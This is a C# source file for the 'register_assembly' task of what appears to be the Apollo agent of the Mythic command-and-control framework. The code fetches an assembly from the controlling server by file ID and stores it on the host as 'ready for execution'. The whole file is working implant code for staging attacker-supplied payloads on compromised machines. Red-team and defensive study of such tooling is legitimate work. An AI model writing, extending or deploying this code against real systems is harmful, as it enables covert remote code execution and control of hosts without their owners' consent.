#define COMMAND_NAME_UPPER

#if DEBUG
#define REGISTER_ASSEMBLY
#endif

#if REGISTER_ASSEMBLY


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.IO;

namespace Tasks
{
    public class register_assembly : Tasking
    {
        [DataContract]
        internal struct RegisterAssemblyParameters
        {
            [DataMember(Name = "assembly_id")]
            internal string FileID;
            [DataMember(Name = "assembly_name")]
            internal string AssemblyName;
        }

        public register_assembly(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            _cancellationToken.Cancel();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                RegisterAssemblyParameters parameters = _jsonSerializer.Deserialize<RegisterAssemblyParameters>(_data.Parameters);
                // some additional upload logic
                if (_agent.GetFileManager().GetFile(
                    _cancellationToken.Token,
                    _data.ID,
                    parameters.FileID,
                    out byte[] fileData))
                {
                    if (_agent.GetFileManager().AddFileToStore(parameters.AssemblyName, fileData))
                    {
                        resp = CreateTaskResponse(
                            $"{parameters.AssemblyName} is now ready for execution",
                            true);
                    } else
                    {
                        resp = CreateTaskResponse(
                            $"Failed to register {parameters.AssemblyName}",
                            true,
                            "error");
                    }
                }
                else
                {
                    if (_cancellationToken.IsCancellationRequested)
                    {
                        resp = CreateTaskResponse($"Task killed.", true, "killed");
                    }
                    else
                    {
                        resp = CreateTaskResponse("Failed to fetch file due to unknown reason.", true, "error");
                    }
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}
#endif